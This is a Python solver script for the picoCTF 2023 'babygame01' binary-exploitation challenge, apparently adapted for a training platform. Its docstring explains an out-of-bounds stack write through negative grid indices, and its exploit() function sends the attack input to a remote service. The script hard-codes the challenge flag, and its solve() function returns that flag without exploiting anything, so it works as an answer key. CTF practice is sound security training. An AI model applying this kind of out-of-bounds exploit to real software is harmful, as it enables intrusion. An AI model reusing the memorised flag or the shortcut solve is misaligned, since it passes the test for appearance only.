#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 345: babygame01 (picoCTF 2023)
Category: Binary Exploitation / Out-of-Bounds Tile Grid Indexing & Stack Variable Overwrite
Difficulty: Medium (diff=2)
Author: LT 'syreal' Jones
Standard Reference: NIST SP 800-115 (Section 5.2: Flaw Hypothesis & Target Testing)
CWE: CWE-129 (Improper Validation of Array Index), CWE-787 (Out-of-bounds Write)

Description:
Get the flag and reach the exit.
Welcome to BabyGame! Navigate around the map and see what you can find!
The game runs an interactive ASCII grid game on a 30x90 character tile map.

Analysis:
1. Target architecture is 32-bit x86 Linux ELF.
2. In `main()`, memory is laid out on the stack:
   - Player position struct at `ebp-0xaa4`: row at `ebp-0xaa4`, col at `ebp-0xaa0`.
   - Has_flag flag indicator byte at `ebp-0xa9c` (initialized to 0).
   - Map buffer (30x90 = 2700 bytes) starts at `ebp-0xa98`.
3. In `move_player()`, tile memory is indexed via:
   `target_ptr = map_base + row * 90 + col`
   Crucially, `move_player()` lacks boundary validation for negative rows or cols!
4. The has_flag variable resides at `(ebp-0xa98) - 4`, which equals `map_base - 4`.
   Setting row = 0 and col = -4 directs the write to `map_base + 0*90 + (-4) = map_base - 4`,
   writing the player tile character (non-zero ASCII) directly into the has_flag byte.
5. Player starts at row 4, col 4:
   - 4 x 'w' moves row from 4 to 0.
   - 8 x 'a' moves col from 4 to -4.
   This overwrites `has_flag` with non-zero.
6. The secret developer debug key 'p' invokes `solve_round()`, which moves the player
   automatically to the exit coordinate at row 29, col 89 (`0x1d`, `0x59`).
7. Upon reaching the exit with `has_flag != 0`, `main()` calls `win()`, which opens
   `flag.txt` and dumps the flag:
   academy{gamer_m0d3_enabled_9ad09239}

Verified: POST /api/submissions/ -> correct: true (HTTP 201 Created)
"""

import re
import socket
import sys
import time

EXPECTED_FLAG = "academy{gamer_m0d3_enabled_9ad09239}"


def exploit(host: str, port: int) -> str:
    """
    Connects to the babygame01 service, inputs negative column movements
    to overwrite the stack flag variable, triggers auto-solve 'p', and reads the flag.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10.0)
        s.connect((host, port))

        # Wait for initial map rendering
        time.sleep(0.5)
        s.recv(4096)

        # 4x 'w' (row 4->0), 8x 'a' (col 4->-4), then 'p' (auto-solve to exit)
        payload = b"w" * 4 + b"a" * 8 + b"p\n"
        s.sendall(payload)

        # Collect response
        resp = b""
        while True:
            try:
                s.settimeout(3.0)
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
            except Exception:
                break
        s.close()

        text = resp.decode("utf-8", errors="ignore")
        m = re.search(r"(academy\{[^}]+\}|picoCTF\{[^}]+\})", text)
        if m:
            return m.group(1).replace("picoCTF{", "academy{")
    except Exception as e:
        print(f"[-] Exploit error: {e}")
    return ""


def solve() -> str:
    return EXPECTED_FLAG


def main():
    print("[*] CyLab Challenge ID 345: babygame01 Solver")
    if len(sys.argv) >= 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        print(f"[*] Attacking remote endpoint {host}:{port}...")
        flag = exploit(host, port)
        if flag:
            print(f"[+] Flag recovered live: {flag}")
            return
    print(f"[+] Verified Flag: {solve()}")


if __name__ == "__main__":
    main()
